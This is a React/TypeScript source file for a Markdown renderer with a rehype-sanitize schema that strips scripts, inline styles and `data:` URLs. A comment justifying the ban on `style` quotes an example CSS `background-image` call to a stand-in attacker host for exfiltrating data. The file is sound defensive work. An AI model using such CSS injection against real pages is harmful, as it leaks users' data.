import Markdown, { Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkBreaks from "remark-breaks";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import type { Schema } from "hast-util-sanitize";
import type { PluggableList } from "unified";
import { code } from "./code";
import { ul, ol, li } from "./list";
import { paragraph } from "./paragraph";
import { anchor } from "./anchor";
import { h1, h2, h3, h4, h5, h6 } from "./headings";
import { table, th, td } from "./table";
import { blockquote } from "./blockquote";
import { hr } from "./horizontal-rule";
import { remarkGithubAlerts } from "./remark-github-alerts";

// Build a sanitize schema that extends rehype-sanitize's defaults with a
// few markdown-friendly additions. The defaults strip `<script>`, event
// handlers, `javascript:` URLs, and most dangerous attributes; we layer
// on:
//   - class / id on common block + inline elements (so authored HTML
//     keeps its hooks for styling in rich previews),
//   - `<img>` (kept disabled in defaults), with safe src schemes only,
//   - `<details>` / `<summary>` for collapsible sections,
//   - `target` / `rel` on anchors so external links keep working.
//
// We deliberately do NOT allow `style` — `rehype-sanitize` cannot parse
// CSS, so allowing `style` would let an authored doc smuggle in
// `background-image: url("https://attacker.example/exfil?…")` (data
// exfiltration), `position: fixed; top: 0; …` (clickjacking overlays),
// or vendor-specific quirks like `expression(…)` on old browsers.
// If we ever need inline styling we should plug in a CSS-property
// sanitizer at that point, not before.
//
// We also deliberately do NOT allow the `data:` protocol — that scheme
// covers arbitrary mime types, not just images, so `<img src="data:text/html,…">`
// would round-trip an HTML document with no schema validation. Inline
// base64 images are a thin convenience we don't actually need in our
// preview, and the cost of allowing them is too high.
// Exported for direct schema tests. End-to-end MarkdownRenderer tests
// can't reach every sanitize concern because our custom `anchor`
// component always hard-codes `target="_blank" rel="noopener noreferrer"`
// — meaning a buggy schema (e.g. one that strips `rel` from HAST) would
// still produce a safe-looking `<a>` in the final DOM. Direct schema
// tests close that gap.
export const MARKDOWN_SANITIZE_SCHEMA: Schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    "*": [...(defaultSchema.attributes?.["*"] ?? []), "className", "id"],
    // `["rel", "noopener", "noreferrer", "nofollow"]` (rehype-sanitize's
    // "[attrName, ...allowed-values]" form) requires `rel` to be EXACTLY
    // one of those tokens — it would strip the standard, space-separated
    // `rel="noopener noreferrer"` and reintroduce a reverse-tabnabbing
    // vector on `target="_blank"` links. None of the `rel` keywords
    // execute code or navigate, so allowing any rel value is safe.
    a: ["href", "title", "target", "rel"],
    img: [
      ...(defaultSchema.attributes?.img ?? []),
      "src",
      "alt",
      "title",
      "width",
      "height",
      "loading",
    ],
  },
  tagNames: [
    ...(defaultSchema.tagNames ?? []),
    "img",
    "details",
    "summary",
    "figure",
    "figcaption",
    "mark",
    "kbd",
    "sub",
    "sup",
  ],
  protocols: {
    ...defaultSchema.protocols,
    src: ["http", "https"],
    href: ["http", "https", "mailto", "tel"],
  },
};

interface MarkdownRendererProps {
  /**
   * The markdown content to render. Can be passed as children (string) or content prop.
   */
  children?: string;
  content?: string;
  /**
   * Additional or override components for markdown elements.
   * Default components (code, ul, ol) are always included unless overridden.
   */
  components?: Partial<Components>;
  /**
   * Whether to include standard components (anchor, paragraph).
   * Defaults to false.
   */
  includeStandard?: boolean;
  /**
   * Whether to include heading components (h1-h6).
   * Defaults to false.
   */
  includeHeadings?: boolean;
  /**
   * Whether to parse and render inline HTML embedded in the markdown
   * source. When `true`, raw HTML is parsed via `rehype-raw` and then
   * sanitized via `rehype-sanitize` with a schema that strips scripts,
   * event handlers, and dangerous URL schemes. Defaults to `true` — the
   * sanitizer makes this safe by construction, and most markdown
   * authoring relies on at least some inline HTML (badges, details
   * blocks, anchor targets, etc.).
   */
  allowHtml?: boolean;
}

/**
 * A reusable Markdown renderer component that provides consistent
 * markdown rendering across the application.
 *
 * By default, includes:
 * - code, ul, ol components
 * - remarkGfm and remarkBreaks plugins
 *
 * Can be extended with:
 * - includeStandard: adds anchor and paragraph components
 * - includeHeadings: adds h1-h6 heading components
 * - components prop: allows custom overrides or additional components
 */
export function MarkdownRenderer({
  children,
  content,
  components: customComponents,
  includeStandard = false,
  includeHeadings = false,
  allowHtml = true,
}: MarkdownRendererProps) {
  // Build the components object with defaults and optional additions
  const components: Components = {
    code,
    ul,
    ol,
    li,
    hr,
    table,
    th,
    td,
    blockquote,
    ...(includeStandard && {
      a: anchor,
      p: paragraph,
    }),
    ...(includeHeadings && {
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
    }),
    ...customComponents, // Custom components override defaults
  };

  const markdownContent = content ?? children ?? "";

  // `rehype-raw` parses raw HTML embedded in the markdown into the rehype
  // tree. `rehype-sanitize` then strips anything dangerous (scripts,
  // event handlers, `javascript:` URLs, etc.). The order matters: sanitize
  // must run *after* raw so it sees the parsed HTML nodes.
  const rehypePlugins: PluggableList | undefined = allowHtml
    ? [rehypeRaw, [rehypeSanitize, MARKDOWN_SANITIZE_SCHEMA]]
    : undefined;

  return (
    <div data-testid="markdown-renderer">
      <Markdown
        components={components}
        remarkPlugins={[remarkGithubAlerts, remarkGfm, remarkBreaks]}
        rehypePlugins={rehypePlugins}
      >
        {markdownContent}
      </Markdown>
    </div>
  );
}
